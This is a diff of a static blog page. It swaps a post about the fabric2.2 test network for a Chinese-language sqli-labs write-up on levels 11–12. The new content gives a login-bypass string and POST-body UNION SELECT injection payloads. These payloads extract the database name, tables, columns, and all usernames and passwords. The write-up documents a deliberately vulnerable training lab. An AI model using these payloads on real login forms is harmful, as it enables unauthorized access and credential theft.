@@ -4,11 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="fabric2.2 test-network测试网络, 是小竹不是小猪">
-    <meta name="description" content="fabric2.2 test-network测试网络./network.sh up
+    <meta name="keywords" content="sqli-lab less10, 是小竹不是小猪">
+    <meta name="description" content="s
+less11–post在输入框输入万能密码实验admin’or’1’=’1# ，密码随意，发现成果登录。并且显示结果账号admin,密码admin.
+得到数据库：
 
-该命令创建两个对等节点和一个排序节点组成的Fabric网络。
-3.3 在通道启动一个链码使用network.sh创建通道后，你可以使用以下命令在通道上启动">
+uname=ad&amp;#39; union select user(),d">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +21,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>fabric2.2 test-network测试网络 | 是小竹不是小猪</title>
+    <title>sqli-lab less10 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -312,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">fabric2.2 test-network测试网络</h1>
+                    <h1 class="description center-align post-title">sqli-lab less10</h1>
                 </div>
             </div>
         </div>
@@ -445,7 +446,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-20
+                    2022-03-01
                 </div>
                 
 
@@ -466,23 +467,33 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="fabric2-2-test-network测试网络"><a href="#fabric2-2-test-network测试网络" class="headerlink" title="fabric2.2 test-network测试网络"></a>fabric2.2 test-network测试网络</h1><pre><code class="shell">./network.sh up
+                <p>s</p>
+<h2 id="less11–post"><a href="#less11–post" class="headerlink" title="less11–post"></a>less11–post</h2><p>在输入框输入万能密码实验admin’or’1’=’1# ，密码随意，发现成果登录。并且显示结果账号admin,密码admin.</p>
+<p>得到数据库：</p>
+<p><img src="/2022/03/01/0301/4.PNG" alt="4"></p>
+<pre><code>uname=ad&#39; union select user(),database() --+&amp;passwd=min&amp;submit=Submit
 </code></pre>
-<p>该命令创建两个对等节点和一个排序节点组成的Fabric网络。</p>
-<p>3.3 在通道启动一个链码<br>使用network.sh创建通道后，你可以使用以下命令在通道上启动链码：</p>
-<p>sudo ./network.sh deployCC</p>
-<p>注意！！！<br>可能出现的问题1<br>执行上面的命令后可能会出现找不到go命令的错误，这是因为sudo命令会重置当前的环境变量，导致go命令找不到。聪明的人可能会想到不加sudo命令，然后运行后你会发现提示权限不够。</p>
-<p>Error: failed to normalize chaincode path: failed to determine module root: exec: “go”: executable file not found in $PATH<br>1<br>解决方法如下：</p>
-<p>vim ~/.bashrc</p>
-<p>开头或末尾添加</p>
-<p>alias sudo=’sudo env PATH=$PATH LD_LIBRARY_PATH=$LD_LIBRARY_PATH’</p>
-<p>保存退出</p>
-<p>重置环境配置</p>
-<p>source ~/.bashrc</p>
-<p>可能出现的问题2<br>执行上面的命令后可能会出现以下错误：</p>
-<p>Error: failed to normalize chaincode path: ‘go list’ failed with: go: github.com/golang/<a href="mailto:&#x70;&#114;&#111;&#x74;&#x6f;&#98;&#x75;&#102;&#64;&#118;&#49;&#x2e;&#x33;&#46;&#50;">&#x70;&#114;&#111;&#x74;&#x6f;&#98;&#x75;&#102;&#64;&#118;&#49;&#x2e;&#x33;&#46;&#50;</a>: Get “<a target="_blank" rel="noopener" href="https://proxy.golang.org/github.com/golang/protobuf/@v/v1.3.2.mod&quot;">https://proxy.golang.org/github.com/golang/protobuf/@v/v1.3.2.mod&quot;</a>: dial tcp 216.58.200.49:443: connect: connection refused: exit status 1<br>1<br>看错误提示可以看到它是访问golang的官网<a target="_blank" rel="noopener" href="https://proxy.golang.org,这是外网,自然报错./">https://proxy.golang.org，这是外网，自然报错。</a><br>解决方法如下：</p>
-<p>在命令行直接运行</p>
-<p>go env -w GO111MODULE=on<br>go env -w GOPROXY=<a target="_blank" rel="noopener" href="https://goproxy.cn,direct/">https://goproxy.cn,direct</a></p>
+<p>得到表名：</p>
+<p><img src="/2022/03/01/0301/5.PNG" alt="5"></p>
+<pre><code>uname=ad&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) --+&amp;passwd=min&amp;submit=Submit
+</code></pre>
+<p>得到字段：</p>
+<p><img src="/2022/03/01/0301/6.PNG" alt="6"></p>
+<pre><code>uname=ad&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) --+&amp;passwd=min&amp;submit=Submit
+</code></pre>
+<p>得到密码</p>
+<p><img src="/2022/03/01/0301/7.PNG" alt="7"></p>
+<pre><code>uname=ad&#39; union select 1,(select group_concat(username,password) from security.users) --+&amp;passwd=min&amp;submit=Submit
+</code></pre>
+<h2 id="less12–post"><a href="#less12–post" class="headerlink" title="less12–post"></a>less12–post</h2><pre><code>尝试：
+uname=&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit
+
+uname=&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit
+
+uname=&quot;) or 1=1#&amp;passwd=admin&amp;submit=Submit
+最后登录成功
+然后步骤和less11一样进行提交。
+</code></pre>
 
                 
             </div>
@@ -509,7 +520,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/01/20/a0120/">http://example.com/2022/01/20/a0120/</a>
+                    <a href="http://example.com/2022/03/01/0301/">http://example.com/2022/03/01/0301/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -716,54 +727,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/20/a0121/">
+                <a href="/2022/03/01/0301/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="SQli-lab test1">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="sqli-lab less10">
                         
-                        <span class="card-title">SQli-lab test1</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-20
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            小竹
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/12/09/vue/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="vue3-摄影平台">
-                        
-                        <span class="card-title">vue3-摄影平台</span>
+                        <span class="card-title">sqli-lab less10</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -774,7 +749,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            小竹
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/02/28/0227/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="sqli-lab  less6-7">
+                        
+                        <span class="card-title">sqli-lab  less6-7</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-28
                             </span>
                         <span class="publish-author">
                             
